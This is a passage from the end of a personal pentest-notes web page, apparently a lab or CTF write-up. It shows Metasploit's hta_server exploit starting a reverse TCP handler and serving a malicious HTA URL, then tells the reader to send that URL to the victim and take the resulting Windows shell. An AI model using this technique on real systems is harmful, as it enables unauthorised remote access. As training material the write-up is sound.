<a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a><span class=p>[*]</span> <span class=n>Exploit</span> <span class=n>completed</span><span class=p>,</span> <span class=n>but</span> <span class=n>no</span> <span class=n>session</span> <span class=n>was</span> <span class=n>created</span><span class=p>.</span>
<a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a>
<a id=__codelineno-13-15 name=__codelineno-13-15 href=#__codelineno-13-15></a><span class=p>[*]</span> <span class=n>Started</span> <span class=n>reverse</span> <span class=n>TCP</span> <span class=n>handler</span> <span class=n>on</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span><span class=p>:</span><span class=n>443</span> 
<a id=__codelineno-13-16 name=__codelineno-13-16 href=#__codelineno-13-16></a><span class=hll><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span> <span class=p>[*]</span> <span class=n>Using</span> <span class=n>URL</span><span class=p>:</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span><span class=p>:</span><span class=n>8080</span><span class=p>/</span><span class=n>hmMe6s</span><span class=p>.</span><span class=n>hta</span>
</span><a id=__codelineno-13-17 name=__codelineno-13-17 href=#__codelineno-13-17></a><span class=p>[*]</span> <span class=n>Server</span> <span class=n>started</span><span class=p>.</span>
</code></pre></div> </li> <li> <p>Step 8: We will notice a highlighted url like the above terminal, send it to the victim website <img alt="Alt text" src=image-6.png></p> </li> <li>Step 9: Find sessions to work by: <code>session -i</code> command</li> <li>Step 10: Get flag<ul> <li>Now, go back to the terminal with metasploit and we see that we have successfully connected to the windows shell <img alt="Alt text" src=image-7.png></li> </ul> </li> </ul> </li> </ol> </div> </div> </div> </div> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 22, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 22, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../../../notes/privilege-escalation/windows/ class="md-footer__link md-footer__link--prev" aria-label="Previous: Windows Privilege Escalation" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Windows Privilege Escalation </div> </div> </a> <a href=../password-attacks/ class="md-footer__link md-footer__link--next" aria-label="Next: Password Attacks" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Password Attacks </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../../javascripts/consent.js></script> <script src=../../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../../javascripts/tablesort.js></script> <script src=../../../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>